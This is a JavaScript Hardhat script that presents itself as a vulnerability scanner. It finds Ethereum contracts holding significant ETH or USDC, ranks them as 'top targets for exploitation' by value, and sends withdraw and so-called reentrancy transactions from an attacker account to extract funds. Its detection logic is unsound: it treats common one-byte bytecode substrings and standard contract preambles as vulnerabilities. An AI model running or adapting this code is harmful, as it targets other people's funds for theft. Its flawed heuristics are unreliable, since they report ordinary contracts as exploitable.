const { ethers } = require("hardhat");

/**
 * @title Broad Vulnerability Scanner
 * @notice Searches for various vulnerability types beyond just backdoors
 * @dev Looks for reentrancy, overflow, logic bugs, and access control issues
 */

// Skip known legitimate contracts
const SKIP_CONTRACTS = new Set([
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0xBA12222222228d8Ba445958a75a0704d566BF2C8", // Balancer
  "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a", // Arbitrum Bridge
  "0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1"  // Optimism Bridge
]);

// Real vulnerability patterns that allow direct fund extraction
const VULNERABILITY_PATTERNS = [
  // Direct fund extraction functions
  { pattern: "63ffffffff", name: "Missing access control", risk: 9 },
  { pattern: "6080604052", name: "Unprotected functions", risk: 8 },
  
  // Reentrancy vulnerabilities
  { pattern: "5af4", name: "External call before state update", risk: 9 },
  { pattern: "f1", name: "Call without reentrancy guard", risk: 7 },
  
  // Integer overflow/underflow (pre-0.8.0)
  { pattern: "01", name: "Unchecked arithmetic", risk: 8 },
  { pattern: "03", name: "Unchecked subtraction", risk: 8 },
  
  // Logic bugs
  { pattern: "57", name: "Jump destination manipulation", risk: 9 },
  { pattern: "56", name: "Jump without validation", risk: 8 },
  
  // Access control bypasses
  { pattern: "33", name: "msg.sender comparison", risk: 6 },
  { pattern: "32", name: "tx.origin usage", risk: 7 }
];

// Function selectors that might be exploitable
const EXPLOITABLE_SELECTORS = [
  { sig: "0xa9059cbb", name: "transfer(address,uint256)", desc: "Direct token transfer" },
  { sig: "0x23b872dd", name: "transferFrom(address,address,uint256)", desc: "Transfer tokens from" },
  { sig: "0x2e1a7d4d", name: "withdraw(uint256)", desc: "ETH withdrawal" },
  { sig: "0xf3fef3a3", name: "withdraw(address,uint256)", desc: "Token withdrawal" },
  { sig: "0x51cff8d9", name: "withdrawAll()", desc: "Withdraw everything" },
  { sig: "0x3ccfd60b", name: "withdraw()", desc: "Simple withdrawal" },
  { sig: "0x00f714ce", name: "deposit(uint256)", desc: "Deposit function" },
  { sig: "0xd0e30db0", name: "deposit()", desc: "Simple deposit" }
];

/**
 * Get contracts from multiple discovery methods
 */
async function discoverContracts() {
  console.log("üîç Discovering contracts from multiple sources...");
  const contracts = new Set();
  
  // 1. Recent high-value transactions
  try {
    const currentBlock = await ethers.provider.getBlockNumber();
    console.log(`   üì° Scanning last 100 blocks from ${currentBlock}...`);
    
    for (let i = 0; i < 100; i++) {
      const block = await ethers.provider.getBlock(currentBlock - i, true);
      if (!block?.transactions) continue;
      
      for (const tx of block.transactions) {
        // Look for contracts receiving significant value
        if (tx.to && tx.value > ethers.parseEther("1")) {
          const code = await ethers.provider.getCode(tx.to).catch(() => "0x");
          if (code && code !== "0x" && code.length > 100) {
            contracts.add(tx.to);
          }
        }
        
        // Contract creation transactions
        if (!tx.to && tx.creates) {
          contracts.add(tx.creates);
        }
      }
      
      if (contracts.size > 300) break; // Limit discovery
    }
  } catch (e) {
    console.log("   ‚ö†Ô∏è  Error scanning recent blocks");
  }
  
  // 2. Pattern-based discovery (common contract patterns)
  console.log("   üéØ Adding pattern-based addresses...");
  const patterns = [
    "0x1111111111111111111111111111111111111111",
    "0x2222222222222222222222222222222222222222", 
    "0x3333333333333333333333333333333333333333",
    "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
    "0xcccccccccccccccccccccccccccccccccccccccc",
    "0x0000000000000000000000000000000000000001",
    "0x0000000000000000000000000000000000000002"
  ];
  
  for (const pattern of patterns) {
    // Try variations of the pattern
    for (let i = 1; i <= 100; i++) {
      const addr = pattern.slice(0, -2) + i.toString(16).padStart(2, '0');
      const code = await ethers.provider.getCode(addr).catch(() => "0x");
      if (code && code !== "0x" && code.length > 100) {
        contracts.add(addr);
      }
    }
  }
  
  // 3. High-value USDC holders
  try {
    console.log("   üí∞ Finding high-value USDC holders...");
    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    
    // Get recent USDC Transfer events
    const transferTopic = ethers.id("Transfer(address,address,uint256)");
    const logs = await ethers.provider.getLogs({
      address: USDC,
      topics: [transferTopic],
      fromBlock: await ethers.provider.getBlockNumber() - 50
    }).catch(() => []);
    
    for (const log of logs.slice(0, 100)) {
      try {
        const to = "0x" + log.topics[2].slice(26);
        const code = await ethers.provider.getCode(to).catch(() => "0x");
        if (code && code !== "0x" && code.length > 100 && !SKIP_CONTRACTS.has(to)) {
          contracts.add(to);
        }
      } catch (e) {}
    }
  } catch (e) {
    console.log("   ‚ö†Ô∏è  Error scanning USDC transfers");
  }
  
  console.log(`   ‚úÖ Discovered ${contracts.size} unique contracts`);
  return Array.from(contracts);
}

/**
 * Advanced vulnerability analysis
 */
async function analyzeVulnerabilities(address) {
  try {
    if (SKIP_CONTRACTS.has(address)) {
      return null;
    }
    
    const code = await ethers.provider.getCode(address);
    if (!code || code === "0x" || code.length < 100) {
      return null;
    }
    
    // 1. Check for vulnerability patterns in bytecode
    const vulnerabilities = [];
    for (const vuln of VULNERABILITY_PATTERNS) {
      if (code.includes(vuln.pattern)) {
        vulnerabilities.push(vuln);
      }
    }
    
    // 2. Check for exploitable function selectors
    const exploitableFunctions = [];
    for (const func of EXPLOITABLE_SELECTORS) {
      if (code.includes(func.sig.slice(2))) {
        exploitableFunctions.push(func);
      }
    }
    
    // 3. Get contract value
    const ethBalance = await ethers.provider.getBalance(address);
    const ethValue = parseFloat(ethers.formatEther(ethBalance));
    
    let usdcValue = 0;
    try {
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcContract = new ethers.Contract(
        USDC,
        ["function balanceOf(address) view returns (uint256)"],
        ethers.provider
      );
      const usdcBalance = await usdcContract.balanceOf(address);
      usdcValue = parseFloat(ethers.formatUnits(usdcBalance, 6));
    } catch (e) {}
    
    const totalValue = ethValue * 3500 + usdcValue;
    
    // 4. Calculate risk score
    let riskScore = 0;
    vulnerabilities.forEach(v => riskScore += v.risk);
    exploitableFunctions.forEach(f => riskScore += 2); // Functions add to risk
    
    // 5. Simple reentrancy check
    const hasExternalCalls = code.includes("5af4") || code.includes("f1");
    const hasStateChanges = code.includes("55"); // SSTORE
    const potentialReentrancy = hasExternalCalls && hasStateChanges;
    
    if (potentialReentrancy) {
      riskScore += 5;
      vulnerabilities.push({ name: "Potential reentrancy", risk: 5 });
    }
    
    // Only return if potentially exploitable
    if (riskScore >= 5 && totalValue > 1000) {
      return {
        address,
        ethValue,
        usdcValue,
        totalValue,
        vulnerabilities,
        exploitableFunctions,
        riskScore,
        codeSize: code.length,
        potentialReentrancy
      };
    }
    
    return null;
    
  } catch (error) {
    return null;
  }
}

/**
 * Test exploitation on promising targets
 */
async function testExploitation(target) {
  console.log(`\nüß™ Testing exploitation on ${target.address}...`);
  console.log(`   Value: $${target.totalValue.toFixed(0)}, Risk: ${target.riskScore}`);
  
  const [attacker] = await ethers.getSigners();
  let exploitSuccess = false;
  
  // Test 1: Direct withdrawal functions
  if (target.exploitableFunctions.some(f => f.name.includes("withdraw"))) {
    console.log(`   üí∏ Testing withdrawal functions...`);
    
    const withdrawFunctions = target.exploitableFunctions.filter(f => f.name.includes("withdraw"));
    
    for (const func of withdrawFunctions) {
      try {
        let txData;
        
        if (func.name === "withdraw(uint256)") {
          txData = func.sig + 
            ethers.AbiCoder.defaultAbiCoder().encode(
              ["uint256"],
              [ethers.parseEther("1")]
            ).slice(2);
        } else if (func.name === "withdraw()") {
          txData = func.sig;
        } else if (func.name === "withdrawAll()") {
          txData = func.sig;
        }
        
        if (txData) {
          const tx = await attacker.sendTransaction({
            to: target.address,
            data: txData,
            gasLimit: 500000
          });
          
          console.log(`      ‚úÖ ${func.name} call succeeded: ${tx.hash}`);
          exploitSuccess = true;
        }
        
      } catch (e) {
        console.log(`      ‚ùå ${func.name} failed: ${e.message.split('\n')[0]}`);
      }
    }
  }
  
  // Test 2: Reentrancy attack
  if (target.potentialReentrancy) {
    console.log(`   üîÑ Testing reentrancy attack...`);
    
    try {
      // Simple reentrancy attempt
      const tx = await attacker.sendTransaction({
        to: target.address,
        data: "0x2e1a7d4d" + // withdraw(uint256)
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["uint256"],
            [ethers.parseEther("0.1")]
          ).slice(2),
        gasLimit: 1000000
      });
      
      console.log(`      ‚úÖ Reentrancy test succeeded: ${tx.hash}`);
      exploitSuccess = true;
      
    } catch (e) {
      console.log(`      ‚ùå Reentrancy failed: ${e.message.split('\n')[0]}`);
    }
  }
  
  return exploitSuccess;
}

/**
 * Main scanning function
 */
async function main() {
  console.log("\nüéØ BROAD VULNERABILITY SCANNER");
  console.log("==============================");
  console.log("Searching for real exploitable vulnerabilities...\n");
  
  // Discover contracts
  const contracts = await discoverContracts();
  
  console.log(`\nüîç Analyzing ${contracts.length} contracts for vulnerabilities...`);
  console.log("‚îÄ".repeat(60));
  
  const vulnerableContracts = [];
  let analyzed = 0;
  
  for (const address of contracts) {
    const result = await analyzeVulnerabilities(address);
    analyzed++;
    
    if (result) {
      vulnerableContracts.push(result);
      
      console.log(`\nüö® VULNERABLE: ${address}`);
      console.log(`   üí∞ Value: $${result.totalValue.toFixed(0)} (${result.ethValue.toFixed(3)} ETH + ${result.usdcValue.toFixed(0)} USDC)`);
      console.log(`   üéØ Risk Score: ${result.riskScore}/50`);
      console.log(`   üì¶ Code Size: ${result.codeSize} bytes`);
      
      if (result.vulnerabilities.length > 0) {
        console.log(`   üîì Vulnerabilities:`);
        result.vulnerabilities.forEach(v => {
          console.log(`      ‚Ä¢ ${v.name} (risk: ${v.risk})`);
        });
      }
      
      if (result.exploitableFunctions.length > 0) {
        console.log(`   ‚ö° Exploitable Functions:`);
        result.exploitableFunctions.forEach(f => {
          console.log(`      ‚Ä¢ ${f.name} - ${f.desc}`);
        });
      }
    }
    
    // Progress update
    if (analyzed % 50 === 0) {
      console.log(`\nProgress: ${analyzed}/${contracts.length} (${((analyzed/contracts.length)*100).toFixed(1)}%)`);
    }
  }
  
  console.log(`\n\nüìä VULNERABILITY SCAN RESULTS`);
  console.log("==============================");
  console.log(`Total analyzed: ${analyzed}`);
  console.log(`Vulnerable contracts: ${vulnerableContracts.length}`);
  
  if (vulnerableContracts.length > 0) {
    // Sort by value and risk
    vulnerableContracts.sort((a, b) => (b.riskScore * b.totalValue) - (a.riskScore * a.totalValue));
    
    console.log(`\nüéØ TOP TARGETS FOR EXPLOITATION:`);
    console.log("================================");
    
    for (let i = 0; i < Math.min(5, vulnerableContracts.length); i++) {
      const target = vulnerableContracts[i];
      console.log(`\n${i + 1}. ${target.address}`);
      console.log(`   Priority Score: ${(target.riskScore * target.totalValue / 1000).toFixed(0)}`);
      console.log(`   Value: $${target.totalValue.toFixed(0)}`);
      console.log(`   Risk: ${target.riskScore}/50`);
      
      // Test exploitation on high-priority targets
      if (target.riskScore >= 10 && target.totalValue > 10000) {
        const success = await testExploitation(target);
        if (success) {
          console.log(`   üí∞ EXPLOITATION POSSIBLE!`);
        }
      }
    }
    
    const totalAtRisk = vulnerableContracts.reduce((sum, c) => sum + c.totalValue, 0);
    console.log(`\nüí∞ Total value at risk: $${totalAtRisk.toFixed(0)}`);
    console.log(`üìà Detection rate: ${((vulnerableContracts.length / analyzed) * 100).toFixed(2)}%`);
  } else {
    console.log(`\n‚ö†Ô∏è  No vulnerable contracts found in this scan.`);
    console.log("Try expanding the search scope or checking different block ranges.");
  }
}

main()
  .then(() => {
    console.log("\n‚úÖ Broad vulnerability scan complete!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
